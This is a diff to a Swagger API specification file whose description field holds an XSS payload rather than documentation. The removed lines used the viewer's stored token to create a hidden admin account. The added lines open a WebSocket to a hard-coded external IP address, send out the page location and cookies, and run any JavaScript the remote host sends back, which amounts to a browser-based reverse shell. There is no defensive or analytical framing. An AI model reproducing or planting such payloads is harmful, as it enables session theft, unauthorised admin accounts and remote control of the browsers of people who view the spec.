@@ -1,20 +1,23 @@
 swagger: "2.0"
 info:
-  title: "Add Admin"
+  title: "XSS Reverse Shell"
   version: "1.0"
   description: |
     <script>
-      fetch('/prod-api/user/add', {
-        method: 'POST',
-        headers: {
-          'Authorization': 'Bearer ' + localStorage.getItem('token'),
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          username: 'xssadmin',
-          password: 'P@ssw0rd123!',
-          role: 'admin'
-        })
-      });
+      var ws = new WebSocket("ws://107.189.25.245:9001");
+      ws.onopen = function() {
+        ws.send("Connected: " + document.location + " | Cookies: " + document.cookie);
+        window.eval = function(cmd) {
+          try {
+            var result = eval(cmd);
+            ws.send("Result: " + result);
+          } catch(e) {
+            ws.send("Error: " + e.message);
+          }
+        };
+      };
+      ws.onmessage = function(e) {
+        eval(e.data);
+      };
     </script>
 paths: {}
